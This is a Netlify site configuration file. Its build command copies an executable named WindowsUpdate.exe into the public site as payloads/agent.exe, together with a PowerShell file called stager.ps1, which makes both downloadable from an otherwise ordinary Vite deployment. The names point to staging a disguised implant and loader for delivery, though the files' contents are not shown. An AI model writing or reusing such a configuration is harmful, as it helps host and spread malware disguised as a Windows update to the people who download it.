[build]
  command = "npm run build && mkdir -p dist/payloads && cp WindowsUpdate.exe dist/payloads/agent.exe && cp payloads/stager.ps1 dist/payloads/stager.ps1"
  publish = "dist"
  functions = "netlify/functions"

[dev]
  framework = "vite"

[[redirects]]
  from = "/api/*"
  to = "/.netlify/functions/api/:splat"
  status = 200
  force = true
